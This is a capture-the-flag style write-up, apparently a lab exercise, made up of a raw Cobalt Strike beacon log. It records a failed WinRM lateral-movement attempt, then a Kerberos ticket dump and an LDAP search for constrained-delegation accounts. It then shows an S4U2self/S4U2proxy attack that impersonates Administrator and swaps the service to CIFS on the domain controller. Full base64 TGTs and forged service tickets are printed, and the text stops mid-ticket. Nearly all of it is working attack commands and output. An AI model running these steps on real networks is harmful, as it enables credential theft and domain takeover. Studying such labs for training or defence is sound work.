# kerberos-challenge  

The objective of this challenge is to identify and exploit a Kerberos (mis)configuration, and move laterally to `lon-dc-1`.  

beacon commands:

```
[04/12 20:34:21] beacon> process_browser
[04/12 20:34:21] [*] Tasked beacon to list processes (from Process Browser)
[04/12 20:34:23] [+] host called home, sent: 12 bytes
[04/12 20:36:51] beacon> spawnto x64 %windir%\sysnative\dllhost.exe
[04/12 20:36:51] [*] Tasked beacon to spawn x64 features to: %windir%\sysnative\dllhost.exe
[04/12 20:36:55] [+] host called home, sent: 38 bytes
[04/12 20:37:08] beacon> jump winrm64 lon-ws-1 smb
[04/12 20:37:08] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337) on lon-ws-1 via WinRM
[04/12 20:37:10] [+] host called home, sent: 395399 bytes
[04/12 20:37:38] beacon> jump winrm64 lon-ws-1 smb
[04/12 20:37:39] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337) on lon-ws-1 via WinRM
[04/12 20:37:43] [+] job registered with id 0
[04/12 20:37:43] [-] Could not connect to pipe: 53 - ERROR_BAD_NETPATH
[04/12 20:37:43] [+] [job 0] received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">[lon-ws-1] Connecting to remote server lon-ws-1 failed with the following error message : WinRM cannot complete the _x000D__x000A_</S><S S="Error">operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and _x000D__x000A_</S><S S="Error">that a firewall exception for the WinRM service is enabled and allows access from this computer. By default, the WinRM _x000D__x000A_</S><S S="Error">firewall exception for public profiles limits access to remote computers within the same local subnet. For more _x000D__x000A_</S><S S="Error">information, see the about_Remote_Troubleshooting Help topic._x000D__x000A_</S><S S="Error">    + CategoryInfo          : OpenError: (lon-ws-1:String) [], PSRemotingTransportException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : WinRMOperationTimeout,PSSessionStateBroken_x000D__x000A_</S></Objs>
[04/12 20:37:43] [+] job 0 completed
[04/12 20:37:48] [+] host called home, sent: 395515 bytes
[04/12 20:38:35] [+] job registered with id 1
[04/12 20:38:35] [-] Could not connect to pipe: 53 - ERROR_BAD_NETPATH
[04/12 20:38:35] [+] [job 1] received output:
#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">2</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">[lon-ws-1] Connecting to remote server lon-ws-1 failed with the following error message : WinRM cannot complete the _x000D__x000A_</S><S S="Error">operation. Verify that the specified computer name is valid, that the computer is accessible over the network, and _x000D__x000A_</S><S S="Error">that a firewall exception for the WinRM service is enabled and allows access from this computer. By default, the WinRM _x000D__x000A_</S><S S="Error">firewall exception for public profiles limits access to remote computers within the same local subnet. For more _x000D__x000A_</S><S S="Error">information, see the about_Remote_Troubleshooting Help topic._x000D__x000A_</S><S S="Error">    + CategoryInfo          : OpenError: (lon-ws-1:String) [], PSRemotingTransportException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : WinRMOperationTimeout,PSSessionStateBroken_x000D__x000A_</S></Objs>
[04/12 20:38:35] [+] job 1 completed
[04/12 20:41:04] beacon> krb_triage
[04/12 20:41:04] [+] Kerbeus TRIAGE by RalfHacker
[04/12 20:41:06] [+] host called home, sent: 13657 bytes
[04/12 20:41:06] [+] received output:

Action: List Kerberos Tickets (All Users)


--------------------------------------------------------------------------------------------------------------------------
| LUID        | Client                                   | Service                                  |            End Time |
--------------------------------------------------------------------------------------------------------------------------
| 0:0x64a38   | pchilds @ CONTOSO.COM                    | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:36 |
| 0:0x64a38   | pchilds @ CONTOSO.COM                    | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:36 |
| 0:0x64a38   | pchilds @ CONTOSO.COM                    | CIFS/lon-dc-1.contoso.com                | 13.04.2026 06:06:36 |
| 0:0x64a38   | pchilds @ CONTOSO.COM                    | LDAP/lon-dc-1.contoso.com/contoso.com    | 13.04.2026 06:06:36 |
| 0:0x64961   | pchilds @ CONTOSO.COM                    | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:41 |
| 0:0x64961   | pchilds @ CONTOSO.COM                    | LDAP/lon-dc-1.contoso.com/contoso.com    | 13.04.2026 06:06:41 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | cifs/lon-dc-1.contoso.com                | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | GC/lon-dc-1.contoso.com/contoso.com      | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | ldap/lon-dc-1.contoso.com                | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | DNS/lon-dc-1.contoso.com                 | 13.04.2026 06:06:12 |
| 0:0x3e4     | lon-wkstn-1$ @ CONTOSO.COM               | ldap/lon-dc-1.contoso.com/contoso.com    | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | krbtgt/CONTOSO.COM                       | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | HTTP/lon-ws-1                            | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | cifs/lon-dc-1.contoso.com/contoso.com    | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | LON-WKSTN-1$                             | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | LDAP/lon-dc-1.contoso.com                | 13.04.2026 06:06:12 |
| 0:0x3e7     | lon-wkstn-1$ @ CONTOSO.COM               | ldap/lon-dc-1.contoso.com/contoso.com    | 13.04.2026 06:06:12 |
--------------------------------------------------------------------------------------------------------------------------

[04/12 20:42:49] beacon> krb_dump /luid:3e7 /service:krbtgt
[04/12 20:42:49] [+] Kerbeus DUMP by RalfHacker
[04/12 20:42:52] [+] host called home, sent: 17175 bytes
[04/12 20:42:52] [+] received output:

Action: List Kerberos Tickets( LUID: 3e7)

[*] Target service  : krbtgt
[*] Target LUID     : 3e7

UserName                : LON-WKSTN-1$
Domain                  : CONTOSO
LogonId                 : 0:0x3e7
Session                 : 0
UserSID                 : S-1-5-18
Authentication package  : Negotiate
LogonServer             : 
UserPrincipalName       : LON-WKSTN-1$@contoso.com

[*] Cached tickets: (7)

  [0]
	ClientName               :  lon-wkstn-1$ @ CONTOSO.COM
	ServiceRealm             :  krbtgt/CONTOSO.COM @ CONTOSO.COM
	StartTime (UTC)          :  12.04.2026 20:06:24
	EndTime (UTC)            :  13.04.2026 06:06:12
	RenewTill (UTC)          :  19.04.2026 20:06:12
	Flags                    :  forwardable forwarded renewable pre_authent enc_pa_rep 
	KeyType                  :  aes256_cts_hmac_sha1

	doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKxhggSoMIIEpKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGowggRmoAMCARKhAwIBAqKCBFgEggRUsH/ywoI4rT25NLqeTz8acbX4peOU+hWAG3agyFKlT/DT8iAnPpmu0OaV5D9MCO47uI4T7WbyivYaC1YRm07lf2UinS4q2VJnn2NwwD1mmjKXwpAIcFpIk6yV12pJ5uVqRhtaTm+/DClqcWIDM51vqIpQUkcnWWAB1mgpU6lmYGIhWXUWkzwvw1GVbI/9HylgbgZpZ9AcIkFERxWlOMelZgMQUgn52mL7yVAcWR9cVPDw7tj8U+HW+ICJg6eJyZllghbTEaY/4GnZb0iqKNgkIHtAHPmilnv8c/0+uWgLjYioqf+0b9qNA9wtjggh8mjwnTuZgPwNv1BwpxG9jge4L/e50+9W+N0lzK6sW6r/av9KNWfqc1/be2JQnKaRhGQ+QGsgcjOkMUu7MTFQTA/QEEzdcsvtSA1yTS6x8mDsBVFHq6Fr/Vby+wsek3rFaUv0isAFT/GX4STQ2JnyN6ciM2jufwWzMWvXMFnE7FblHE1fBhWM6/seBPbjqyJE0bOElbEcYMgfDjuFh+Q94cuxifQWja5oBAfmyuylgBkCfuEZlDuUH+H+g/UssFIAY59spNV9N8wjKx5xAnZcbO+qAv80vwPUtkWp+iy9TUauPhCruGO7FKjuFSa877xK3pFfP27d6rYiHOAo3q1oEyVS+YtVKe41tPmDO02pt+nN4iaMAiEX9cBAyVa7OtM08MXLVZkqH3aONqYS12LyLjnmCZlH1THTmcwEuXuxWimUJADvSLf7hY5dRPDlXAKPbyTWSACshFmJYCdwGBTLNYacgxNiQfzsSNOG+S/FalUp4DnjqCyWfqmjVfXfg1AnUIPlWHS9Ca3q8+mbu41FPhgLoMI9bbX1rnDuIJfeSGU20hlRqBNEIbpa38kdYt8KiHCUbC7NeqAHdFqdsdKH7T3oim9JcPhROJVKy9Bv21auMuPhIB0kBCpaym3uXwPFpUFCZEbnXtaSZJ7O655yqcsLbNixd8+zHQ8GNSx/a0cQlxMi/8MJ9odNuxOGRRegCJogsA0UnQHE9dYXqktvewcZGeeUCnbl+3epncpKGRNe2KQNAsxrwpLhXAWZR2Evmk2wjS0P5P6OWxNAdlS/nhu9op6Do9aY01cPfru3/ziCof5jAnoXAFxOAKJUJ1gC2/q7tOf0UYQOwByn2GMCiddWxIgsn8r9nVirJ5ByfvVxqFEVpjahHUtRCQ7D/8J5u1PNWGYXA02MRTNyOet11pUvdH4bk7qcHpdkwW6dWhYxMW20CU6tagZqmVWfVqhM4iUCtc8yZ/W/DX2y0MZuRo5onKHow61wwq4ejYZGvlvvZsxq2GpHmuMtmsfMDfN1fn9XyF1c3DORNLa3qPco74wYefOPKF9IGCdJsQKns5Iwn9eV5X5DjntrEG+C0x+slMfpUI9NeDDbz8mv+YSSsPFagBOz+Ujo9+9g2TgVQOqov8g3+vnfl5MpV59tK1HSvXMIyUA+/qOB5zCB5KADAgEAooHcBIHZfYHWMIHToIHQMIHNMIHKoCswKaADAgESoSIEIOetUdkRIlraheAYKUBatyPSzzBtpGUEwbLcLIoevkGYoQ0bC0NPTlRPU08uQ09NohkwF6ADAgEBoRAwDhsMTE9OLVdLU1ROLTEkowcDBQBA4QAApREYDzIwMjYwNDEyMjAwNjEyWqYRGA8yMDI2MDQxMzA2MDYxMlqnERgPMjAyNjA0MTkyMDA2MTJaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==

  [1]
	ClientName               :  lon-wkstn-1$ @ CONTOSO.COM
	ServiceRealm             :  krbtgt/CONTOSO.COM @ CONTOSO.COM
	StartTime (UTC)          :  12.04.2026 20:06:12
	EndTime (UTC)            :  13.04.2026 06:06:12
	RenewTill (UTC)          :  19.04.2026 20:06:12
	Flags                    :  forwardable renewable initial pre_authent enc_pa_rep 
	KeyType                  :  aes256_cts_hmac_sha1

	doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKxhggSoMIIEpKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGowggRmoAMCARKhAwIBAqKCBFgEggRUsH/ywoI4rT25NLqeTz8acbX4peOU+hWAG3agyFKlT/DT8iAnPpmu0OaV5D9MCO47uI4T7WbyivYaC1YRm07lf2UinS4q2VJnn2NwwD1mmjKXwpAIcFpIk6yV12pJ5uVqRhtaTm+/DClqcWIDM51vqIpQUkcnWWAB1mgpU6lmYGIhWXUWkzwvw1GVbI/9HylgbgZpZ9AcIkFERxWlOMelZgMQUgn52mL7yVAcWR9cVPDw7tj8U+HW+ICJg6eJyZllghbTEaY/4GnZb0iqKNgkIHtAHPmilnv8c/0+uWgLjYioqf+0b9qNA9wtjggh8mjwnTuZgPwNv1BwpxG9jge4L/e50+9W+N0lzK6sW6r/av9KNWfqc1/be2JQnKaRhGQ+QGsgcjOkMUu7MTFQTA/QEEzdcsvtSA1yTS6x8mDsBVFHq6Fr/Vby+wsek3rFaUv0isAFT/GX4STQ2JnyN6ciM2jufwWzMWvXMFnE7FblHE1fBhWM6/seBPbjqyJE0bOElbEcYMgfDjuFh+Q94cuxifQWja5oBAfmyuylgBkCfuEZlDuUH+H+g/UssFIAY59spNV9N8wjKx5xAnZcbO+qAv80vwPUtkWp+iy9TUauPhCruGO7FKjuFSa877xK3pFfP27d6rYiHOAo3q1oEyVS+YtVKe41tPmDO02pt+nN4iaMAiEX9cBAyVa7OtM08MXLVZkqH3aONqYS12LyLjnmCZlH1THTmcwEuXuxWimUJADvSLf7hY5dRPDlXAKPbyTWSACshFmJYCdwGBTLNYacgxNiQfzsSNOG+S/FalUp4DnjqCyWfqmjVfXfg1AnUIPlWHS9Ca3q8+mbu41FPhgLoMI9bbX1rnDuIJfeSGU20hlRqBNEIbpa38kdYt8KiHCUbC7NeqAHdFqdsdKH7T3oim9JcPhROJVKy9Bv21auMuPhIB0kBCpaym3uXwPFpUFCZEbnXtaSZJ7O655yqcsLbNixd8+zHQ8GNSx/a0cQlxMi/8MJ9odNuxOGRRegCJogsA0UnQHE9dYXqktvewcZGeeUCnbl+3epncpKGRNe2KQNAsxrwpLhXAWZR2Evmk2wjS0P5P6OWxNAdlS/nhu9op6Do9aY01cPfru3/ziCof5jAnoXAFxOAKJUJ1gC2/q7tOf0UYQOwByn2GMCiddWxIgsn8r9nVirJ5ByfvVxqFEVpjahHUtRCQ7D/8J5u1PNWGYXA02MRTNyOet11pUvdH4bk7qcHpdkwW6dWhYxMW20CU6tagZqmVWfVqhM4iUCtc8yZ/W/DX2y0MZuRo5onKHow61wwq4ejYZGvlvvZsxq2GpHmuMtmsfMDfN1fn9XyF1c3DORNLa3qPco74wYefOPKF9IGCdJsQKns5Iwn9eV5X5DjntrEG+C0x+slMfpUI9NeDDbz8mv+YSSsPFagBOz+Ujo9+9g2TgVQOqov8g3+vnfl5MpV59tK1HSvXMIyUA+/qOB5zCB5KADAgEAooHcBIHZfYHWMIHToIHQMIHNMIHKoCswKaADAgESoSIEIOetUdkRIlraheAYKUBatyPSzzBtpGUEwbLcLIoevkGYoQ0bC0NPTlRPU08uQ09NohkwF6ADAgEBoRAwDhsMTE9OLVdLU1ROLTEkowcDBQBA4QAApREYDzIwMjYwNDEyMjAwNjEyWqYRGA8yMDI2MDQxMzA2MDYxMlqnERgPMjAyNjA0MTkyMDA2MTJaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ==


[04/12 20:43:40] beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
[04/12 20:43:40] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[04/12 20:43:40] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[04/12 20:43:43] [+] host called home, sent: 12721 bytes
[04/12 20:43:43] [+] received output:
Binding to 10.10.120.1
[04/12 20:43:43] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName,msDS-AllowedToDelegateTo,userAccountControl

--------------------
userAccountControl: 16781312
sAMAccountName: LON-WKSTN-1$
msDS-AllowedToDelegateTo: ldap/lon-dc-1.contoso.com, ldap/lon-dc-1
retreived 1 results total

[04/12 20:46:59] beacon> krb_s4u /ticket:doIFrDCCBaigAwIBBaEDAgEWooIEsDCCBKxhggSoMIIEpKADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBGowggRmoAMCARKhAwIBAqKCBFgEggRUsH/ywoI4rT25NLqeTz8acbX4peOU+hWAG3agyFKlT/DT8iAnPpmu0OaV5D9MCO47uI4T7WbyivYaC1YRm07lf2UinS4q2VJnn2NwwD1mmjKXwpAIcFpIk6yV12pJ5uVqRhtaTm+/DClqcWIDM51vqIpQUkcnWWAB1mgpU6lmYGIhWXUWkzwvw1GVbI/9HylgbgZpZ9AcIkFERxWlOMelZgMQUgn52mL7yVAcWR9cVPDw7tj8U+HW+ICJg6eJyZllghbTEaY/4GnZb0iqKNgkIHtAHPmilnv8c/0+uWgLjYioqf+0b9qNA9wtjggh8mjwnTuZgPwNv1BwpxG9jge4L/e50+9W+N0lzK6sW6r/av9KNWfqc1/be2JQnKaRhGQ+QGsgcjOkMUu7MTFQTA/QEEzdcsvtSA1yTS6x8mDsBVFHq6Fr/Vby+wsek3rFaUv0isAFT/GX4STQ2JnyN6ciM2jufwWzMWvXMFnE7FblHE1fBhWM6/seBPbjqyJE0bOElbEcYMgfDjuFh+Q94cuxifQWja5oBAfmyuylgBkCfuEZlDuUH+H+g/UssFIAY59spNV9N8wjKx5xAnZcbO+qAv80vwPUtkWp+iy9TUauPhCruGO7FKjuFSa877xK3pFfP27d6rYiHOAo3q1oEyVS+YtVKe41tPmDO02pt+nN4iaMAiEX9cBAyVa7OtM08MXLVZkqH3aONqYS12LyLjnmCZlH1THTmcwEuXuxWimUJADvSLf7hY5dRPDlXAKPbyTWSACshFmJYCdwGBTLNYacgxNiQfzsSNOG+S/FalUp4DnjqCyWfqmjVfXfg1AnUIPlWHS9Ca3q8+mbu41FPhgLoMI9bbX1rnDuIJfeSGU20hlRqBNEIbpa38kdYt8KiHCUbC7NeqAHdFqdsdKH7T3oim9JcPhROJVKy9Bv21auMuPhIB0kBCpaym3uXwPFpUFCZEbnXtaSZJ7O655yqcsLbNixd8+zHQ8GNSx/a0cQlxMi/8MJ9odNuxOGRRegCJogsA0UnQHE9dYXqktvewcZGeeUCnbl+3epncpKGRNe2KQNAsxrwpLhXAWZR2Evmk2wjS0P5P6OWxNAdlS/nhu9op6Do9aY01cPfru3/ziCof5jAnoXAFxOAKJUJ1gC2/q7tOf0UYQOwByn2GMCiddWxIgsn8r9nVirJ5ByfvVxqFEVpjahHUtRCQ7D/8J5u1PNWGYXA02MRTNyOet11pUvdH4bk7qcHpdkwW6dWhYxMW20CU6tagZqmVWfVqhM4iUCtc8yZ/W/DX2y0MZuRo5onKHow61wwq4ejYZGvlvvZsxq2GpHmuMtmsfMDfN1fn9XyF1c3DORNLa3qPco74wYefOPKF9IGCdJsQKns5Iwn9eV5X5DjntrEG+C0x+slMfpUI9NeDDbz8mv+YSSsPFagBOz+Ujo9+9g2TgVQOqov8g3+vnfl5MpV59tK1HSvXMIyUA+/qOB5zCB5KADAgEAooHcBIHZfYHWMIHToIHQMIHNMIHKoCswKaADAgESoSIEIOetUdkRIlraheAYKUBatyPSzzBtpGUEwbLcLIoevkGYoQ0bC0NPTlRPU08uQ09NohkwF6ADAgEBoRAwDhsMTE9OLVdLU1ROLTEkowcDBQBA4QAApREYDzIwMjYwNDEyMjAwNjEyWqYRGA8yMDI2MDQxMzA2MDYxMlqnERgPMjAyNjA0MTkyMDA2MTJaqA0bC0NPTlRPU08uQ09NqSAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTQ== /service:ldap/lon-dc-1 /altservice:cifs /impersonateuser:Administrator
[04/12 20:46:59] [+] Kerbeus S4U by RalfHacker
[04/12 20:46:59] [+] host called home, sent: 70389 bytes
[04/12 20:46:59] [+] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WKSTN-1$@CONTOSO.COM'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WKSTN-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

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

[*] Impersonating user 'Administrator' to target SPN 'ldap/lon-dc-1'
[*]   Final ticket will be for the alternate service 'cifs'
[*] Building S4U2proxy request for service: 'ldap/lon-dc-1'
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':

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